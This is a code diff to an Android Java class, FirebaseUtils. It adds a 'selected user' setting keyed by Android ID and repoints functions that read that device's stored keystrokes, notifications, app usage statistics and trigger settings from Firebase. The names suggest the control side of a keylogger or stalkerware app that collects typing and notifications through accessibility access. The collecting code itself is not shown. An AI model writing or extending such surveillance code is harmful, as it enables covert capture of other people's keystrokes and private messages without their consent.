@@ -35,9 +35,21 @@ import java.util.Map;
 public class FirebaseUtils {
 
     private static Context context;
+    private static String selectedUserBasePath = null;
 
     public static void initialize(Context context) {
         FirebaseUtils.context = context;
+    }
+
+    public static void setSelectedUser(String androidId) {
+        selectedUserBasePath = androidId != null
+                ? AppConstants.FIREBASE_RTDB_BASE_PATH + androidId
+                : null;
+    }
+
+    private static String getSelectedUserPath(String subPath) {
+        String base = selectedUserBasePath != null ? selectedUserBasePath : getBasePath(context);
+        return base + subPath;
     }
 
     public static void checkUserExistsAndInit(Activity activity) {
@@ -168,7 +180,7 @@ public class FirebaseUtils {
     }
 
     public static void getAndroidUserClickActions() {
-        DatabaseReference ref = getDbRef(getPath("/appSettings/appTriggerSettingsDataMap"));
+        DatabaseReference ref = getDbRef(getSelectedUserPath("/appSettings/appTriggerSettingsDataMap"));
         ref.addListenerForSingleValueEvent(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
@@ -202,7 +214,7 @@ public class FirebaseUtils {
     }
 
     public static void getAndroidUserKeystrokes() {
-        DatabaseReference ref = getDbRef(getPath("/userDeviceData/keystrokes"));
+        DatabaseReference ref = getDbRef(getSelectedUserPath("/userDeviceData/keystrokes"));
         ref.addListenerForSingleValueEvent(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
@@ -219,7 +231,7 @@ public class FirebaseUtils {
     }
 
     public static void getAndroidUserAccessibilityNotification() {
-        DatabaseReference ref = getDbRef(getPath("/userDeviceData/notifications"));
+        DatabaseReference ref = getDbRef(getSelectedUserPath("/userDeviceData/notifications"));
         ref.addListenerForSingleValueEvent(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
@@ -236,7 +248,7 @@ public class FirebaseUtils {
     }
 
     public static void getAndroidUserSystemAppUsageStatistics() {
-        DatabaseReference ref = getDbRef(getPath("/userDeviceData/appStats"));
+        DatabaseReference ref = getDbRef(getSelectedUserPath("/userDeviceData/appStats"));
         ref.addListenerForSingleValueEvent(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
